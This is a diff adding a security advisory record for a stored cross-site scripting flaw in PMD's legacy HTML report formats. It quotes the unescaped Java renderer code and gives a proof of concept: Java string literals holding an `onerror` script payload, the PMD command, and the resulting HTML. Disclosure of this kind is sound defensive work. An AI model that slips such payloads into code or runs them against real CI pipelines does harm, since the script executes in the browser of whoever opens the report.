@@ -1,0 +1,192 @@
+{
+    "id": "GHSA-8rr6-2qw5-pc7r",
+    "summary": "PMD Designer has Stored XSS in VBHTMLRenderer and YAHTMLRenderer via unescaped violation messages",
+    "details": "### Summary\nPMD's `vbhtml` and `yahtml` report formats insert rule violation messages into HTML output without escaping. When PMD analyzes untrusted source code containing crafted string literals, the generated HTML report contains executable JavaScript that runs when opened in a browser.\n\nWhile the default `html` format is not affected via rule violation messages (it correctly uses `StringEscapeUtils.escapeHtml4()`), it has a similar problem when rendering suppressed violations. The user supplied message (the reason for the suppression) was not escaped.\n\n### Details\n`VBHTMLRenderer.java` line 71 appends `rv.getDescription()` directly into HTML:\n\n```java\nsb.append(\"<td><font class=body>\").append(rv.getDescription()).append(\"</font></td>\");\n```\n\n`YAHTMLRenderer.java` lines 196\u2013203 does the same via `renderViolationRow()`:\n\n```java\nprivate String renderViolationRow(String name, String value) {\n    return \"<tr><td><b>\" + name + \"</b></td>\" + \"<td>\" + value + \"</td></tr>\";\n}\n```\n\nCalled at line 172:\n\n```java\nout.print(renderViolationRow(\"Description:\", violation.getDescription()));\n```\n\nThe violation message originates from `AvoidDuplicateLiteralsRule.java` line 91, which embeds raw string literal values via `first.toPrintableString()`. This calls `StringUtil.escapeJava()` (line 476\u2013480), which is a Java source escaper \u2014 it passes `<`, `>`, and `&` through unchanged because they are printable ASCII (0x20\u20130x7e).\n\nBy contrast, `HTMLRenderer.java` line 143 properly escapes:\n\n```java\nString d = StringEscapeUtils.escapeHtml4(rv.getDescription());\n```\n### PoC\n\n1. Create a Java file with 4+ duplicate string literals containing an HTML payload:\n\n```java\npublic class Exploit {\n    String a = \"<img src=x onerror=alert(document.domain)>\";\n    String b = \"<img src=x onerror=alert(document.domain)>\";\n    String c = \"<img src=x onerror=alert(document.domain)>\";\n    String d = \"<img src=x onerror=alert(document.domain)>\";\n}\n```\n\n2. Run PMD with the `vbhtml` format:\n\n```bash\npmd check -R category/java/errorprone.xml -f vbhtml -d Exploit.java -r report.html\n```\n\n3. Open `report.html` in a browser. A JavaScript alert executes showing `document.domain`.\n\nThe generated HTML contains the unescaped tag:\n\n```html\n<td><font class=body>The String literal \"<img src=x onerror=alert(document.domain)>\" appears 4 times in this file</font></td>\n```\n\nTested and confirmed on PMD 7.22.0-SNAPSHOT (commit bcc646c53d).\n\n### Impact\nStored cross-site scripting (XSS). Affects CI/CD pipelines that run PMD with `--format vbhtml` or `--format yahtml` on untrusted source code (e.g., pull requests from external contributors) and expose the HTML report as a build artifact. JavaScript executes in the browser context of anyone who opens the report.\n\nPractical impact is limited because `vbhtml` and `yahtml` are legacy formats rarely used in practice. The default `html` format has a similar issue with user messages from suppressed violations.\n\n### Fixes\n* See [#6475](https://github.com/pmd/pmd/issues/6475): \\[core] Fix stored XSS in VBHTMLRenderer and YAHTMLRenderer",
+    "aliases": [
+        "CVE-2026-28338"
+    ],
+    "modified": "2026-02-28T06:43:32.470831Z",
+    "published": "2026-02-28T02:49:29Z",
+    "database_specific": {
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-02-28T02:49:29Z",
+        "nvd_published_at": "2026-02-27T21:16:19Z",
+        "cwe_ids": [
+            "CWE-79"
+        ]
+    },
+    "references": [
+        {
+            "type": "WEB",
+            "url": "https://github.com/pmd/pmd/security/advisories/GHSA-8rr6-2qw5-pc7r"
+        },
+        {
+            "type": "ADVISORY",
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-28338"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/pmd/pmd/pull/6475"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/pmd/pmd/commit/c140c0e1de5853a08efb84c9f91dfeb015882442"
+        },
+        {
+            "type": "PACKAGE",
+            "url": "https://github.com/pmd/pmd"
+        }
+    ],
+    "affected": [
+        {
+            "package": {
+                "name": "net.sourceforge.pmd:pmd-core",
+                "ecosystem": "Maven",
+                "purl": "pkg:maven/net.sourceforge.pmd/pmd-core"
+            },
+            "ranges": [
+                {
+                    "type": "ECOSYSTEM",
+                    "events": [
+                        {
+                            "introduced": "0"
+                        },
+                        {
+                            "fixed": "7.22.0"
+                        }
+                    ]
+                }
+            ],
+            "versions": [
+                "5.2.0",
+                "5.2.1",
+                "5.2.2",
+                "5.2.3",
+                "5.3.0",
+                "5.3.1",
+                "5.3.2",
+                "5.3.3",
+                "5.3.4",
+                "5.3.5",
+                "5.3.6",
+                "5.3.7",
+                "5.3.8",
+                "5.4.0",
+                "5.4.1",
+                "5.4.2",
+                "5.4.3",
+                "5.4.4",
+                "5.4.5",
+                "5.4.6",
+                "5.5.0",
+                "5.5.1",
+                "5.5.2",
+                "5.5.3",
+                "5.5.4",
+                "5.5.5",
+                "5.5.6",
+                "5.5.7",
+                "5.6.0",
+                "5.6.1",
+                "5.7.0",
+                "5.8.0",
+                "5.8.1",
+                "6.0.0",
+                "6.0.1",
+                "6.1.0",
+                "6.10.0",
+                "6.11.0",
+                "6.12.0",
+                "6.13.0",
+                "6.14.0",
+                "6.15.0",
+                "6.16.0",
+                "6.17.0",
+                "6.18.0",
+                "6.19.0",
+                "6.2.0",
+                "6.20.0",
+                "6.21.0",
+                "6.22.0",
+                "6.23.0",
+                "6.24.0",
+                "6.25.0",
+                "6.26.0",
+                "6.27.0",
+                "6.28.0",
+                "6.29.0",
+                "6.3.0",
+                "6.30.0",
+                "6.31.0",
+                "6.32.0",
+                "6.33.0",
+                "6.34.0",
+                "6.35.0",
+                "6.36.0",
+                "6.37.0",
+                "6.38.0",
+                "6.39.0",
+                "6.4.0",
+                "6.40.0",
+                "6.41.0",
+                "6.42.0",
+                "6.43.0",
+                "6.44.0",
+                "6.45.0",
+                "6.46.0",
+                "6.47.0",
+                "6.48.0",
+                "6.49.0",
+                "6.5.0",
+                "6.50.0",
+                "6.51.0",
+                "6.52.0",
+                "6.53.0",
+                "6.54.0",
+                "6.55.0",
+                "6.6.0",
+                "6.7.0",
+                "6.8.0",
+                "6.9.0",
+                "7.0.0",
+                "7.0.0-rc1",
+                "7.0.0-rc2",
+                "7.0.0-rc3",
+                "7.0.0-rc4",
+                "7.1.0",
+                "7.10.0",
+                "7.11.0",
+                "7.12.0",
+                "7.13.0",
+                "7.14.0",
+                "7.15.0",
+                "7.16.0",
+                "7.17.0",
+                "7.18.0",
+                "7.19.0",
+                "7.2.0",
+                "7.20.0",
+                "7.21.0",
+                "7.3.0",
+                "7.4.0",
+                "7.5.0",
+                "7.6.0",
+                "7.7.0",
+                "7.8.0",
+                "7.9.0"
+            ],
+            "database_specific": {
+                "last_known_affected_version_range": "<= 7.21.0",
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-8rr6-2qw5-pc7r/GHSA-8rr6-2qw5-pc7r.json"
+            }
+        }
+    ],
+    "schema_version": "1.7.3",
+    "severity": [
+        {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N"
+        }
+    ]
+}
